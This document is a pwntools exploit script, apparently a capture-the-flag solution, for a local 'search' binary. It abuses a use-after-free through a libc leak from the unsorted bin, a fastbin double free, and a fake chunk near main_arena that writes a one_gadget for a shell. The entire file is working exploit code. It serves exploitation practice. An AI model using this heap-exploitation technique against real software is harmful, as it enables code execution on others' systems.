# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')
'''
漏洞：uaf，指针未清零
利用：
1、leak main arena
2、double free
3、fastbin attack:   mainarena = unsortedbin - 0x58
                     fakeAddr = mainarena - 0x33         
                     size(7f)(0x13*"\x00"+one_gadget)
'''
p = process("./search")
elf = ELF("./search")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def index_sentence(s):
    p.recvuntil("3: Quit\n")
    p.sendline('2')
    p.recvuntil("Enter the sentence size:\n")
    p.sendline(str(len(s)))
    p.send(s)


def search_word(word):
    p.recvuntil("3: Quit\n")
    p.sendline('1')
    p.recvuntil("Enter the word size:\n")
    p.sendline(str(len(word)))
    p.send(word)

gdb.attach(p)
payload = "aaa "
payload = payload.ljust(0x7d,"b")
payload += " m "
index_sentence(payload)
search_word("m")
p.recvuntil("Delete this sentence (y/n)?")
p.sendline("y")
search_word('\x00')
x = p.recvuntil("Delete this sentence (y/n)?")
main_arena_addr = u64(x[27:33]+"\x00\x00")-0x58
log.success("mainArena: " + hex(main_arena_addr))
libc_base = main_arena_addr-0x3c4b20
log.success("libcBase: " + hex(libc_base))
p.sendline("n")

payload = "aaa "
payload = payload.ljust(0x5d,"b")
payload += " n "
index_sentence(payload)
index_sentence(payload)
index_sentence(payload)
search_word("n")
# a->b->c->null
p.sendline("y")
p.sendline("y")
p.sendline("y")
search_word("\x00")
# a->b->a
p.sendline("y")
p.sendline("n")
p.sendline("n")

payload = p64(main_arena_addr-0x33)
payload = payload.ljust(0x60,"b")
index_sentence(payload)
index_sentence(payload)
index_sentence(payload)
one_gadget = libc_base + 0xf1147
payload = "\x00"*3+p64(0)*2+p64(one_gadget)
payload = payload.ljust(0x60,"b")
pause()
index_sentence(payload)

p.interactive()


